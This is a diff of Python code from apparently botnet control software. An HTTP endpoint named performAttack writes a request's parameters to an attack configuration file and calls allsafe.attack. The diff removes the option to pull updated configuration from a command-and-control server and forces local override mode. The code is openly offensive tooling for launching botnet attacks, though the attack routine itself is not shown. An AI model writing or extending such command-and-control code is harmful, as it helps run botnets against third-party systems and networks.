@@ -89,21 +89,14 @@ def performAttack():
             return "OK", 200
 
         # prepare configuration
-        cc_server = prepareConfigFile(request.json)
+        prepareConfigFile(request.json)
         config_path = './data/current_attack.json'
         # prepare botnet resources
-        # if the attack to be carried without updates from C&C?
-        if 'local_attack' in request.json:
-            allsafe.attack(config_path, override=True)
-        # else we set to attack to be carried using updated configuration if any
-        else:
-            if '://' not in cc_server:
-                cc_server = 'http://' + cc_server
-            allsafe.attack(config_path, override=False)
-            # return success
+        # the attack will be carried
+        allsafe.attack(config_path, override=True)
+        # return success
         return "OK", 200
     except Exception as e:
-        print(str(e))
         return "Invalid request", 402
 
 def prepareConfigFile(params, where='./data/current_attack.json'):
@@ -214,7 +207,7 @@ def prepareConfigFile(params, where='./data/current_attack.json'):
     file = open(where, "w")
     file.write(json.dumps(localRootSchema,indent=4))
     file.close()
-    return params['cc_server']
+    return
 
 
 if __name__ == "__main__":
